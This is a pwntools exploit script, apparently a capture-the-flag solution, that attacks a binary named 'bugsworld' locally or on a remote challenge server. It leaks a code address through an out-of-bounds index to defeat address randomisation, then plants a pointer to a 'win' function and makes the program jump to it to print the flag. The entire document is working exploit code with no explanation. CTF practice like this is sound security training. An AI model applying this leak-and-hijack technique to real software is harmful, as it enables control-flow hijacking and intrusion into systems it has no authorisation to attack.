from pwn import *

HALT = 5
JUMP = 6

context.arch = "amd64"
e = ELF("./bugsworld")

if args.REMOTE:
    p = remote("chall.pwnoh.io", 13382)
elif args.GDB:
    p = gdb.debug("./bugsworld")
else:
    p = process("./bugsworld")


def run_program(program):
    p.recvuntil(b"> ")
    p.sendline(str(len(program)).encode())
    p.recvuntil(b"> ")
    p.sendline(" ".join(str(x) for x in program).encode())


run_program([(e.symbols["instruction_table"] - e.symbols["instruction_names"]) // 32])

do_move_addr = u64(
    p.recvuntil(b"Invalid instruction\n")
    .removesuffix(b"Invalid instruction\n")
    .ljust(8, b"\0")
)

info(f"{do_move_addr=:08x}")

base = do_move_addr - e.symbols["do_move"]

bytecode_addr = base + e.symbols["bytecode"]

instruction_table_addr = base + e.symbols["instruction_table"]

win_pointer_address = bytecode_addr + 4 * 8

run_program(
    [
        JUMP,
        3,
        HALT,
        (win_pointer_address - instruction_table_addr) // 8,
        base + e.symbols["win"],
    ]
)

run_program([JUMP, 3])

output = p.recvall()
print(output.strip().split(b"\n")[-1].decode())
